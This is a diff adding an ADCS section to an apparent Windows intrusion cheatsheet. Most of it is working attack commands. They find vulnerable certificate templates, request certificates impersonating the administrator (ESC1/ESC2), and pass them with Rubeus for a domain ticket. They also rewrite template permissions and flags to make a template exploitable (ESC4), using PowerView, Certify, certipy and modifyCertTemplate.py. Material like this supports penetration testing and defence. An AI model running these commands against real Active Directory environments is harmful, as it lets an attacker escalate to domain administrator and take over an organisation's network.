@@ -27,6 +27,10 @@ A cheatsheet in order to help during intrusion steps on Windows environment.
     - [DNS Admin Abuse](#dns-admin-abuse)
     - [Backup Operator Abuse](#backup-operator-abuse)
     - [Exchange Abuse](#exchange-abuse)
+    - [ADCS](#adcs)
+       - [Recon](#recon)
+       - [ESC1-ESC2](#esc1-esc2)
+       - [ESC4](#esc4)
   - [Credential Harversting](#credential-harvesting)
     - [LSASS](#lsass)
       - [mimikatz](#mimikatz)
@@ -461,6 +465,131 @@ reg save HKLM\SYSTEM c:\temp\system.hive
 - [Abusing Exchange one Api call from DA](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [CVE-2020-0688](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
 - [PrivExchange](https://github.com/dirkjanm/PrivExchange) Exchange your privileges for Domain Admin privs by abusing Exchange
+
+#### ADCS
+##### Recon
+Windows
+```
+# find vulnerable templates
+.\Certify.exe find /vulnerable
+
+# find vulnerable templates for the current user
+.\Certify.exe find /vulnerable /currentuser
+
+# find templates with SAN enabled
+.\Certify.exe find /enrolleeSuppliesSubject
+```
+
+Linux
+```
+certipy corp.local/user:password@10.10.10.10 find -vuln
+```
+
+##### ESC1-ESC2
+
+Windows
+```
+# request a certificate with SAN
+.\Certify.exe request /ca:corp.local\ca_name /template:template_name /altname:administrator
+
+# convert pem to pfx
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# pass the certificate with rubeus
+.\Rubeus.exe asktgt /user:Administrator /password:pass /certificate:cert.pfx /ptt /nowrap
+```
+
+Linux
+```
+certipy corp.local/user:password@10.10.10.10 req -ca ca_name -template template_name -alt administrator
+```
+##### ESC4
+Make it vulnerable to ESC1!
+
+Change the following attributes in the template.
+
+`mspki-enrollment-flag`: Disable PEND_ALL_REQUESTS flag in order to request the template without Manager Approval.\
+In GUI, this attribute can be enabled by checking "CA manager approval" check box in "Issuance Requirements" tab.
+
+`mspki-ra-signature`: Specify the number of Authorized Signatures to issue certificate.\
+In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and setting the number.
+
+`mspki-certificate-name-flag`: Enable ENROLLEE_SUPPLIES_SUBJECT flag in order to specify an arbitrary user account Subject Alternative Name (SAN) in certificate request.\
+In GUI, this attribute can be enabled by choosing "Supplly in the request" in "Subject Name" tab.
+
+`mspki-certificate-application-policy`: Specify Certificate Application Policy Extension in order to validate the authentication.\
+In GUI, this attribute can be controlled by setting "Application Policies" in "Extensions" tab. It takes precedence over `pkiextendedkeyusage` and `mspki-ra-application-policies`.
+
+`pkiextendedkeyusage`: Specify Extended Key Usage (EKU).
+    Client Authentication 1.3.6.1.5.5.7.3.2
+    Smart Card Logon 1.3.6.1.4.1.311.20.2.2
+    PKINIT Client Authentication 1.3.6.1.5.2.3.4
+    Any Purpose 2.5.29.37.0
+    No EKU
+
+`mspki-ra-application-policies`: This attribute encapsulates embedded properties for multipurpose use.\
+In GUI, this attribute can be controlled by checking "This number of authorized signatures" check box in "Issuance Requirements" tab and choosing "Application Policy" menu. Certify.exe displays this attribute as Application Policies.
+
+Add enrollments rights.
+
+`Certificate-Enrollment`: The corresponding GUID is 0e10c968-78fb-11d2-90d4-00c04f79dc55.
+
+`Certificate-AutoEnrollment`: The corresponding GUID is a05b8cc2-17bc-4802-a710-e7c15ab866a2.
+
+Or yolo it with 00000000-0000-0000-0000-000000000000 (all extended rights)
+
+Windows
+```
+# add enroll rights with PowerView
+Add-DomainObjectAcl -TargetIdentity template_name -PrincipalIdentity controlled_user -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=corp,DC=local" -Verbose
+
+# disable manager approval
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -XOR @{'mspki-enrollment-flag'=2} -Verbose
+
+# disable signature requirements
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -Set @{'mspki-ra-signature'=0} -Verbose
+
+# enable SAN attribute
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -XOR @{'mspki-certificate-name-flag'=1} -Verbose
+
+# add authentication EKUs
+Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Identity template_name -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
+
+# request certificate for administrator
+.\Certify.exe request /ca:corp.local\ca_name /template:template_name /altname:administrator
+
+# convert pem to pfx
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# pass the certificate with rubeus
+.\Rubeus.exe asktgt /user:Administrator /password:pass /certificate:cert.pfx /ptt /nowrap
+```
+
+Linux
+
+Using modifyCertTemplate.py and certipy
+
+```
+# saved all previous attributes before modification
+python3 modifyCertTemplate.py corp.local/user:password -template template_name
+python3 modifyCertTemplate.py corp.local/user:password -template template_name get-acl 
+
+# disable manager approval
+python3 modifyCertTemplate.py corp.local/user:password -template template_name -property mspki-enrollment-flag -value 2 
+
+# disable signature requirements
+python3 modifyCertTemplate.py corp.local/user:password -template template_name -property mspki-ra-signature -value 0
+
+# enable SAN attribute
+python3 modifyCertTemplate.py corp.local/user:password -template template_name -property msPKI-Certificate-Name-Flag -add enrollee_supplies_subject 
+
+# add authentication EKUs
+python3 modifyCertTemplate.py corp.local/user:password -template template_name -property mspki-certificate-application-policy -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.4.1.311.20.2.2'"
+
+# request certificate for administrator
+certipy corp.local/user:password@10.10.10.10 req -ca ca_name -template template_name -alt administrator
+```
+
 
 ### Credential Harvesting
 
